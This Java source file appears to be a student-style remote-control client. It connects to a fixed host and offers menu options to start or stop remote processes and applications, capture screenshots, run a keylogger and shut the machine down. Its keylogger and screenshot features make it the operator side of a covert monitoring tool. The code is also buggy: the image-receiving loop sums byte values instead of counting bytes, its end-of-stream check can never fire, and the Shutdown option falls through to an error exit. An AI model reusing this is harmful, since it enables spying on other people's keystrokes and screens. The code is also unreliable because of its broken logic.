// A Java program for a Client
import com.github.kwhat.jnativehook.GlobalScreen;
import com.github.kwhat.jnativehook.keyboard.NativeKeyEvent;
import com.github.kwhat.jnativehook.keyboard.NativeKeyListener;

import java.net.*;
import java.io.*;
import java.util.Scanner;
import java.lang.Object;
import java.awt.Image;

import java.io.File;
import javax.imageio.ImageIO;
import java.awt.image.BufferedImage;

import java.io.OutputStream;
import java.io.PrintWriter;

import static java.lang.System.exit;

public class Client
{
    // Initialize socket and input output streams
    private Socket socket            = null;
    private DataInputStream  in   = null;
    private DataOutputStream out     = null;

    // Constructor to put ip address and port
    public Client(String address, int port) throws IOException {
        // Establish a connection
        try
        {
            socket = new Socket(address, port);
            System.out.println("Connected");

            // takes input from terminal
            in  = new DataInputStream(
                    new BufferedInputStream(socket.getInputStream()));
            // sends output to the socket
            out    = new DataOutputStream(socket.getOutputStream());

        } catch(IOException u)
        {
            System.out.println(u);
        }
    }
    public static void clearScreen() {
        System.out.print("\033[H\033[2J");
        System.out.flush();
    }
    // Option 1------------------------------------------------------------------------------------------------
    static void handleOption1(DataInputStream in, DataOutputStream out) throws IOException {
        // Print data
        String temp = "";
        while (true){
            temp = in.readUTF();
            if (temp.equals("#")){
                break;
            }
            System.out.println(temp);
        }

        // Get option (start/stop)
        Scanner myObj = new Scanner(System.in);

        System.out.println("1. Start process");
        System.out.println("2. Stop process");
        System.out.println("Please enter your choice: ");

        String choice = myObj.nextLine();
        if (choice.equals("1")){ // Start
            System.out.print("Enter app you want to start: ");
            String appName = myObj.nextLine();

            out.writeUTF("START");
            out.writeUTF(appName);
        }
        else if (choice.equals("2")){ //  Stop
            System.out.print("Enter our pip: ");
            String pid = myObj.nextLine();

            out.writeUTF("STOP");
            out.writeUTF(pid);

        }
    }
    // Option 2------------------------------------------------------------------------------------------------
    static void handleOption2(DataInputStream in, DataOutputStream out) throws IOException {
        // Print data
        String temp = "";
        while (true){
            temp = in.readUTF();
            if (temp.equals("#")){
                break;
            }
            System.out.println(temp);
        }

        // Get option (start/stop)
        Scanner myObj = new Scanner(System.in);

        System.out.println("1. Start application");
        System.out.println("2. Stop application");
        System.out.print("Please enter your choice: ");

        String choice = myObj.nextLine();
        if (choice.equals("1")){ // Start
            System.out.print("Enter app you want to start: ");
            String appName = myObj.nextLine();

            out.writeUTF("START");
            out.writeUTF(appName);
        }
        else if (choice.equals("2")){ //  Stop
            System.out.print("Enter our Id: ");
            String pid = myObj.nextLine();

            out.writeUTF("STOP");
            out.writeUTF(pid);
        }
    }
    // Option 3------------------------------------------------------------------------------------------------
    static void handleOption3(Socket socket, DataInputStream in, DataOutputStream out) throws IOException {
        Scanner myObj = new Scanner(System.in);
        System.out.print("Enter your image name (*.png): ");
        String imageName = myObj.nextLine();

        // Receive image
        String path = String.format("%s.png", imageName);

        DataInputStream dis = new DataInputStream(socket.getInputStream());
        FileOutputStream fout = new FileOutputStream(path);

        int i, size = 0, imageSize = 0;
        long count = 0;

        // Receive image size
        String temp = in.readUTF();
        imageSize = Integer.parseInt(temp);

        // Receive image
        while (size != imageSize) {
             i = dis.read();
             if (i < -1)
                 break;
             size += i;
             fout.write(i);
        }
        System.out.println(size);
        System.out.println(imageSize);


    }
    // Option 4------------------------------------------------------------------------------------------------
    static void handleOption4(Socket socket, DataInputStream in, DataOutputStream out) throws IOException {
        Scanner myObj = new Scanner(System.in);
        System.out.println("Press STOP to end up: ");
        String mess = myObj.nextLine();

        out.writeUTF(mess);

        String key = in.readUTF();
        System.out.println(key);
    }



    public static void main(String[] args) throws IOException {
        while (true){
            System.out.print("Please enter address: ");
            Scanner obj = new Scanner(System.in);
            String address = obj.nextLine();

            if (address.equals("192.168.126.1")){
                break;
            }
            else{
                System.out.print("Address is not true. Please try agan!");
            }
        }

        Client client = new Client("192.168.126.1", 5000);

        String clientOption = "";
        // Menu
        while (true)
        {
            try
            {
                clientOption = "";
                System.out.println("1. Start/Stop Process Running");
                System.out.println("2. Start/Stop Application Running");
                System.out.println("3. Take Screenshot");
                System.out.println("4. Keylogger");
                System.out.println("5. Shutdown");
                System.out.println("6. Exit");
                System.out.println();

                System.out.print("Please choose your option: ");
                Scanner myObj = new Scanner(System.in);
                clientOption = myObj.nextLine();

                client.out.writeUTF(clientOption);
            }
            catch(IOException i)
            {
                System.out.println(i);
            }

            // Check option
            if (clientOption.equals("1")){
                handleOption1(client.in, client.out);
            }
            else if (clientOption.equals("2")){
                handleOption2(client.in, client.out);
            }
            else if (clientOption.equals("3")){
                handleOption3(client.socket, client.in, client.out);
            }
            else if (clientOption.equals("4")){
                handleOption4(client.socket, client.in, client.out);
            }
            else if (clientOption.equals("6")){
                break;
            }
            else{
                System.out.println("Error");
                exit(0);
            }
            clearScreen();
        }

        // close the connection
        try
        {
            client.in.close();
            client.out.close();
            client.socket.close();
        }
        catch(IOException i)
        {
            System.out.println(i);
        }
    }
}

